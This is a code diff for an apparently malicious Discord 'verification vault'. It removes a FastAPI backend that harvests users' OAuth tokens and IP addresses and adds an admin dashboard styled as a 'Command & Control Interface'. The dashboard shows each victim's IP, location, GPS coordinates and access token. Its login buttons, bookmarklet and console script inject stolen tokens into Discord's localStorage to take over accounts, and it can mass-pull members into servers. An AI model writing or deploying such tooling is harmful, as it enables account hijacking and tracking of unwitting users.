@@ -1,188 +1,363 @@
-from fastapi import FastAPI, Request, Depends, HTTPException, Form, BackgroundTasks
-from fastapi.responses import RedirectResponse, HTMLResponse
-from fastapi.staticfiles import StaticFiles
-from fastapi.templating import Jinja2Templates
-import requests
-import datetime
-from sqlalchemy.orm import Session
-import database as db
-import config
-from typing import Optional
+<!DOCTYPE html>
+<html lang="en">
 
-app = FastAPI()
-db.init_db()
-
-# Static and Templates
-app.mount("/static", StaticFiles(directory="static"), name="static")
-templates = Jinja2Templates(directory="templates")
-
-def get_db():
-    session = db.SessionLocal()
-    try:
-        yield session
-    finally:
-        session.close()
-
-@app.get("/", response_class=HTMLResponse)
-async def home(request: Request):
-    # VaultCord style verification landing page
-    return templates.TemplateResponse("index.html", {"request": request, "client_id": config.CLIENT_ID, "redirect_uri": config.REDIRECT_URI})
-
-@app.get("/login")
-async def login():
-    # Redirect to Discord OAuth2
-    url = f"https://discord.com/api/oauth2/authorize?client_id={config.CLIENT_ID}&redirect_uri={config.REDIRECT_URI}&response_type=code&scope=identify+guilds.join"
-    return RedirectResponse(url)
-
-@app.get("/callback")
-async def callback(code: str, request: Request, dbs: Session = Depends(get_db)):
-    # Exchange code for token
-    data = {
-        'client_id': config.CLIENT_ID,
-        'client_secret': config.CLIENT_SECRET,
-        'grant_type': 'authorization_code',
-        'code': code,
-        'redirect_uri': config.REDIRECT_URI
-    }
-    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-    r = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
-    
-    if r.status_code != 200:
-        return HTMLResponse("Failed to verify. Please try again.", status_code=400)
-    
-    token_data = r.json()
-    access_token = token_data['access_token']
-    refresh_token = token_data['refresh_token']
-    expires_in = token_data['expires_in']
-    
-    # Get User Info
-    user_r = requests.get("https://discord.com/api/users/@me", headers={'Authorization': f"Bearer {access_token}"})
-    user_info = user_r.json()
-    
-    # Save/Update in DB
-    existing_member = dbs.query(db.Member).filter(db.Member.user_id == user_info['id']).first()
-    expiry_date = datetime.datetime.utcnow() + datetime.timedelta(seconds=expires_in)
-    
-    if existing_member:
-        existing_member.access_token = access_token
-        existing_member.refresh_token = refresh_token
-        existing_member.expires_at = expiry_date
-        existing_member.username = user_info['username']
-        existing_member.ip_address = request.client.host
-    else:
-        new_member = db.Member(
-            user_id=user_info['id'],
-            username=user_info['username'],
-            avatar=user_info['avatar'],
-            access_token=access_token,
-            refresh_token=refresh_token,
-            expires_at=expiry_date,
-            ip_address=request.client.host
-        )
-        dbs.add(new_member)
-    
-    dbs.commit()
-    
-    return templates.TemplateResponse("success.html", {"request": request, "user": user_info})
-
-from typing import Optional
-
-@app.get("/admin", response_class=HTMLResponse)
-async def admin_panel(request: Request, password: Optional[str] = None, dbs: Session = Depends(get_db)):
-    if password != config.ADMIN_PASSWORD:
-        return HTMLResponse("Unauthorized", status_code=401)
-    
-    members = dbs.query(db.Member).all()
-    return templates.TemplateResponse("dashboard.html", {"request": request, "members": members, "count": len(members), "password": password})
-
-async def refresh_user_tokens(dbs: Session):
-    """
-    Background worker to keep the Vault tokens valid.
-    """
-    now = datetime.datetime.utcnow()
-    # Find tokens expiring in the next 7 days (broad window for safety)
-    expiring_soon = dbs.query(db.Member).filter(db.Member.expires_at < now + datetime.timedelta(days=7)).all()
-    
-    refreshed = 0
-    failed = 0
-    
-    for member in expiring_soon:
-        data = {
-            'client_id': config.CLIENT_ID,
-            'client_secret': config.CLIENT_SECRET,
-            'grant_type': 'refresh_token',
-            'refresh_token': member.refresh_token
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OXY Vault | Admin Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="/static/style.css">
+    <style>
+        .stats-card {
+            background: linear-gradient(145deg, rgba(20, 20, 20, 0.8), rgba(10, 10, 10, 0.8));
+            border-left: 4px solid var(--blood-red);
         }
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-        try:
-            r = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers, timeout=5)
-            if r.status_code == 200:
-                new_data = r.json()
-                member.access_token = new_data['access_token']
-                member.refresh_token = new_data['refresh_token']
-                member.expires_at = now + datetime.timedelta(seconds=new_data['expires_in'])
-                member.last_updated = now
-                refreshed += 1
-            else:
-                failed += 1
-        except Exception:
-            failed += 1
-    
-    dbs.commit()
-    return refreshed, failed
 
-@app.post("/admin/sync")
-async def sync_tokens(background_tasks: BackgroundTasks, password: str = Form(...), dbs: Session = Depends(get_db)):
-    if password != config.ADMIN_PASSWORD:
-        return {"error": "Unauthorized"}
-    
-    background_tasks.add_task(refresh_user_tokens, dbs)
-    return {"status": "sync_initiated"}
-
-@app.get("/api/cron/refresh")
-async def cron_refresh_tokens(password: str, dbs: Session = Depends(get_db)):
-    """
-    Automated endpoint for Vercel Cron Jobs to keep tokens alive.
-    URL: /api/cron/refresh?password=YOUR_ADMIN_PASSWORD
-    """
-    if password != config.ADMIN_PASSWORD:
-        return {"error": "Unauthorized"}
-    
-    refreshed, failed = await refresh_user_tokens(dbs)
-    return {"status": "success", "refreshed": refreshed, "failed": failed}
-
-@app.post("/admin/restore")
-async def restore_members(guild_id: str = Form(...), password: str = Form(...), dbs: Session = Depends(get_db)):
-    if password != config.ADMIN_PASSWORD:
-        return {"error": "Unauthorized"}
-
-    members = dbs.query(db.Member).all()
-    restored_count = 0
-    failed_count = 0
-    
-    for member in members:
-        # Add to guild: PUT /guilds/{guild_id}/members/{user_id}
-        url = f"https://discord.com/api/guilds/{guild_id}/members/{member.user_id}"
-        headers = {
-            "Authorization": f"Bot {config.BOT_TOKEN}",
-            "Content-Type": "application/json"
+        table {
+            border-collapse: separate;
+            border-spacing: 0 8px;
         }
-        body = {
-            "access_token": member.access_token
+
+        tr {
+            background: rgba(255, 255, 255, 0.02);
+            transition: all 0.2s ease;
         }
-        
-        try:
-            r = requests.put(url, json=body, headers=headers, timeout=5)
-            if r.status_code in [201, 204]:
-                restored_count += 1
-            else:
-                failed_count += 1
-        except Exception:
-            failed_count += 1
-            
-    return {"status": "success", "restored": restored_count, "failed": failed_count}
 
-if __name__ == "__main__":
-    import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+        tr:hover {
+            background: rgba(255, 0, 0, 0.05);
+            transform: scale(1.01);
+        }
 
+        td,
+        th {
+            padding: 1rem;
+        }
+
+        th {
+            text-transform: uppercase;
+            font-size: 0.75rem;
+            letter-spacing: 0.1em;
+            color: #666;
+        }
+    </style>
+</head>
+
+<body class="bg-[#050505] min-h-screen text-white p-8">
+    <div class="mesh-bg"></div>
+
+    <div class="max-w-6xl mx-auto">
+        <!-- Header -->
+        <div class="flex flex-col md:flex-row justify-between items-center mb-12 gap-6">
+            <div>
+                <h1 class="text-4xl font-extrabold glow-text tracking-tighter">OXY DASHBOARD</h1>
+                <p class="text-gray-500 mono text-xs mt-1 uppercase tracking-widest">Command & Control Interface v1.0
+                </p>
+            </div>
+
+            <div class="flex gap-4">
+                <div class="stats-card p-4 px-8 rounded-lg shadow-xl">
+                    <p class="text-[10px] text-gray-500 uppercase">Total Verified</p>
+                    <p class="text-3xl font-black text-white">{{ count }}</p>
+                </div>
+                <div class="stats-card p-4 px-8 rounded-lg shadow-xl border-l-[#ff0000]">
+                    <p class="text-[10px] text-gray-500 uppercase">Restoration Ready</p>
+                    <p class="text-3xl font-black text-green-500">ACTIVE</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bookmarklet Setup -->
+        <div class="glass-card p-6 mb-8 border-l-4 border-blue-500">
+            <h2 class="text-sm font-bold text-blue-500 mb-2 uppercase tracking-widest">OXY ONE-CLICK SETUP</h2>
+            <p class="text-xs text-gray-400 mb-4">Drag the button below to your bookmarks bar to enable one-click
+                logins.</p>
+            <a id="bookmarkletBtn" href="#"
+                class="inline-block bg-red-600 text-white text-[10px] font-black px-6 py-2 rounded-full shadow-lg shadow-red-600/20 hover:scale-105 transition-transform uppercase tracking-tighter">
+                OXY ACCESS KEY
+            </a>
+        </div>
+
+        <!-- Tools Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
+            <!-- Restore Tool -->
+            <div class="glass-card p-8">
+                <h2 class="text-xl font-bold mb-6 flex items-center gap-2">
+                    <span class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></span>
+                    MASS RESTORE
+                </h2>
+                <form action="/admin/restore" method="POST" id="restoreForm">
+                    <input type="hidden" name="password" value="{{ password }}">
+                    <div class="mb-4">
+                        <label class="block text-[10px] text-gray-400 uppercase mb-2 ml-1">Target Guild ID</label>
+                        <input type="text" name="guild_id" required placeholder="123456789..."
+                            class="w-full bg-black/40 border border-white/10 p-3 rounded-lg focus:border-red-500 outline-none transition-all">
+                    </div>
+                    <button type="submit" class="btn-primary w-full text-xs">
+                        INITIATE PULL
+                    </button>
+                    <div id="restoreResult" class="mt-4 text-[10px] hidden"></div>
+                </form>
+            </div>
+
+            <!-- Sync Tool -->
+            <div class="glass-card p-8">
+                <h2 class="text-xl font-bold mb-6 flex items-center gap-2 text-blue-500">
+                    <span class="w-2 h-2 bg-blue-600 rounded-full"></span>
+                    SESSION MAINTENANCE
+                </h2>
+                <p class="text-xs text-gray-500 mb-6">Refreshes every OAuth2 token in the vault to prevent session
+                    expiry.</p>
+                <form action="/admin/sync" method="POST" id="syncForm">
+                    <input type="hidden" name="password" value="{{ password }}">
+                    <button type="submit"
+                        class="w-full bg-blue-600/20 border border-blue-500/30 text-blue-500 p-3 rounded-lg hover:bg-blue-600/40 transition-all font-bold tracking-widest text-[10px]">
+                        SYNCHRONIZE TOKENS
+                    </button>
+                    <div id="syncResult" class="mt-4 text-[10px] hidden"></div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Member Table -->
+        <div class="overflow-x-auto">
+            <table class="w-full text-left">
+                <thead>
+                    <tr>
+                        <th>Identity</th>
+                        <th>User ID</th>
+                        <th>Last Seen IP</th>
+                        <th>Location</th>
+                        <th>GPS Coords</th>
+                        <th>OAuth2 Token</th>
+                        <th>Status</th>
+                        <th>Registered</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for member in members %}
+                    <tr class="rounded-lg border-b border-white/5">
+                        <td>
+                            <div class="flex items-center gap-3">
+                                <div
+                                    class="w-8 h-8 rounded-full bg-red-900/30 flex items-center justify-center border border-red-500/20 overflow-hidden">
+                                    {% if member.avatar %}
+                                    <img src="https://cdn.discordapp.com/avatars/{{ member.user_id }}/{{ member.avatar }}.png"
+                                        alt="">
+                                    {% else %}
+                                    <span class="text-[10px] text-red-500">{{ member.username[:2]|upper }}</span>
+                                    {% endif %}
+                                </div>
+                                <div>
+                                    <p class="font-bold text-sm">{{ member.username }}</p>
+                                </div>
+                            </div>
+                        </td>
+                        <td class="mono text-xs text-gray-500">{{ member.user_id }}</td>
+                        <td class="mono text-xs text-gray-400">{{ member.ip_address }}</td>
+                        <td>
+                            <div class="flex flex-col">
+                                <span class="text-xs font-bold">{{ member.location_country }}</span>
+                                <span class="text-[10px] text-gray-500">{{ member.location_city }}</span>
+                            </div>
+                        </td>
+                        <td>
+                            {% if member.latitude and member.longitude %}
+                            <div class="flex flex-col gap-1">
+                                <span class="text-[9px] mono text-red-400">{{ member.latitude }}, {{ member.longitude
+                                    }}</span>
+                                <a href="https://www.google.com/maps?q={{ member.latitude }},{{ member.longitude }}"
+                                    target="_blank"
+                                    class="text-[8px] bg-red-600/10 border border-red-500/20 px-2 py-1 rounded hover:bg-red-600/20 text-center transition-all text-red-500 font-bold uppercase tracking-tighter">VIEW
+                                    ON MAP</a>
+                            </div>
+                            {% else %}
+                            <span class="text-[9px] text-gray-600 uppercase italic">GPS DENIED</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            <div class="flex flex-col gap-2">
+                                <div class="flex items-center gap-2">
+                                    <input type="password" value="{{ member.access_token }}" readonly
+                                        class="bg-black/40 border border-white/5 text-[9px] p-1 rounded w-32 mono focus:outline-none"
+                                        id="token-{{ member.user_id }}">
+                                    <button onclick="copyToken('token-{{ member.user_id }}', this)"
+                                        class="text-[10px] text-red-500 hover:text-white transition-colors">COPY</button>
+                                </div>
+                                <button onclick="quickLogin('{{ member.access_token }}')"
+                                    class="text-[9px] bg-red-600 border border-red-500/50 text-white py-1 rounded hover:bg-red-700 transition-all font-black uppercase tracking-tighter">
+                                    LOGIN
+                                </button>
+                                <button onclick="generateLoginScript('{{ member.access_token }}')"
+                                    class="text-[8px] text-gray-500 hover:text-white transition-all uppercase underline">
+                                    Manual Dispatch
+                                </button>
+                            </div>
+                        </td>
+                        <td>
+                            <span
+                                class="px-2 py-1 bg-green-900/20 text-green-500 text-[10px] rounded border border-green-500/20 uppercase font-bold">Verified</span>
+                        </td>
+                        <td class="text-xs text-gray-500">{{ member.last_updated.strftime('%Y-%m-%d %H:%M') }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        // Restore Form Logic
+        document.getElementById('restoreForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('button');
+            const resultDiv = document.getElementById('restoreResult');
+            const formData = new FormData(e.target);
+
+            btn.disabled = true;
+            btn.textContent = "EXECUTING PROTOCOL...";
+            resultDiv.className = "mt-4 text-[10px] text-yellow-500 block";
+            resultDiv.textContent = "Connecting to Discord... Do not refresh.";
+
+            try {
+                const res = await fetch('/admin/restore', { method: 'POST', body: formData });
+                const data = await res.json();
+                if (data.failed > 0 && data.debug_errors) {
+                    resultDiv.className = "mt-4 p-3 bg-red-900/20 border border-red-500/30 rounded text-red-500 block";
+                    let errHtml = `PARTIAL SUCCESS: Restored ${data.restored}, Failed ${data.failed}.<br><br><b>DEBUG LOG:</b><ul class='mt-2 list-disc ml-4'>`;
+                    data.debug_errors.forEach(err => {
+                        errHtml += `<li>${err}</li>`;
+                    });
+                    errHtml += "</ul>";
+                    resultDiv.innerHTML = errHtml;
+                } else {
+                    resultDiv.className = "mt-4 p-3 bg-black/60 border border-green-500/30 rounded text-green-400 block";
+                    resultDiv.innerHTML = `SUCCESS: Pulled ${data.restored} members.`;
+                }
+            } catch (err) {
+                resultDiv.className = "mt-4 text-red-500 block";
+                resultDiv.textContent = "FAILED: Connection error.";
+            } finally {
+                btn.disabled = false;
+                btn.textContent = "INITIATE PULL";
+            }
+        };
+
+        // Sync Form Logic
+        document.getElementById('syncForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('button');
+            const resultDiv = document.getElementById('syncResult');
+            const formData = new FormData(e.target);
+
+            btn.disabled = true;
+            btn.textContent = "SYNCING...";
+            resultDiv.className = "mt-4 text-[10px] text-blue-400 block";
+            resultDiv.textContent = "Refresh task queued in background.";
+
+            try {
+                await fetch('/admin/sync', { method: 'POST', body: formData });
+                setTimeout(() => {
+                    resultDiv.textContent = "Sync protocol initiated successfully.";
+                }, 2000);
+            } catch (err) {
+                resultDiv.textContent = "Failed to queue sync task.";
+            } finally {
+                btn.disabled = false;
+                btn.textContent = "SYNCHRONIZE TOKENS";
+            }
+        };
+        // Copy Token Logic
+        function copyToken(id, btn) {
+            const input = document.getElementById(id);
+            navigator.clipboard.writeText(input.value);
+            const originalText = btn.textContent;
+            btn.textContent = "COPIED!";
+            btn.classList.add("text-white");
+            setTimeout(() => {
+                btn.textContent = originalText;
+                btn.classList.remove("text-white");
+            }, 2000);
+        }
+        // Generate Login Script Logic
+        function generateLoginScript(token) {
+            const script = `function login(token) {
+  setInterval(() => {
+    document.body.appendChild(document.createElement(\`iframe\`)).contentWindow.localStorage.token = \`"\${token}"\`;
+  }, 50);
+  setTimeout(() => {
+    location.reload();
+  }, 2500);
+}
+
+login('${token}');`;
+
+            document.getElementById('loginScriptDisplay').textContent = script;
+            document.getElementById('scriptModal').classList.remove('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('scriptModal').classList.add('hidden');
+        }
+
+        // One-Click Login Logic
+        function quickLogin(token) {
+            // Copy token to clipboard first
+            navigator.clipboard.writeText(token);
+
+            // Open Discord in new tab
+            window.open('https://discord.com/login', '_blank');
+
+            // Show toast/alert
+            alert("TOKEN COPIED. Once Discord loads, click 'OXY ACCESS KEY' in your bookmarks.");
+        }
+
+        // Bookmarklet Generator
+        const bookmarkletCode = `javascript:(function(){const token = prompt('Enter Token (or leave blank if copied)'); if(token !== null){ function login(t){setInterval(()=>{document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = '"'+t+'"';},50);setTimeout(()=>{location.reload();},500);} login(token || navigator.clipboard.readText().then(t => login(t))); }})();`;
+
+        // Simpler bookmarklet that just grabs from clipboard
+        const easyBookmarklet = `javascript:(function(){
+            function login(t){
+                if(!t) return alert('No token found in clipboard!');
+                setInterval(()=>{document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = '"'+t+'"';},50);
+                setTimeout(()=>{location.reload();},500);
+            }
+            navigator.clipboard.readText().then(t => login(t.trim())).catch(() => {
+                const t = prompt('Paste Token:');
+                if(t) login(t.trim());
+            });
+        })();`;
+
+        document.getElementById('bookmarkletBtn').href = easyBookmarklet.replace(/\n/g, '').replace(/\s\s+/g, ' ');
+
+        function copyToClipboard(text, btn) {
+            navigator.clipboard.writeText(text);
+            const originalText = btn.textContent;
+            btn.textContent = "COPIED!";
+            setTimeout(() => { btn.textContent = originalText; }, 2000);
+        }
+    </script>
+
+    <!-- Script Modal -->
+    <div id="scriptModal"
+        class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center hidden">
+        <div class="glass-card p-8 max-w-2xl w-full mx-4 border-l-4 border-red-500">
+            <h3 class="text-xl font-bold text-red-500 mb-4 tracking-tighter uppercase">Discord Auto-Login Script</h3>
+            <p class="text-gray-400 text-xs mb-4">Paste the following script into your browser's console (F12 > Console)
+                while on <span class="text-white font-bold">discord.com/login</span> to access this account.</p>
+
+            <div class="relative bg-black/60 border border-white/10 p-4 rounded-lg mb-6">
+                <pre id="loginScriptDisplay"
+                    class="text-blue-400 text-[10px] whitespace-pre-wrap mono h-32 overflow-y-auto"></pre>
+                <button onclick="copyToClipboard(document.getElementById('loginScriptDisplay').textContent, this)"
+                    class="absolute top-2 right-2 bg-red-600/20 text-red-500 text-[9px] px-2 py-1 rounded border border-red-500/30 hover:bg-red-600/40 transition-all font-bold">COPY
+                    SCRIPT</button>
+            </div>
+
+            <button onclick="closeModal()"
+                class="w-full bg-white/5 border border-white/10 text-gray-400 py-3 rounded-lg hover:bg-white/10 transition-all text-xs font-bold uppercase tracking-widest">CLOSE
+                DISPATCH</button>
+        </div>
+    </div>
+</body>
+
+</html>
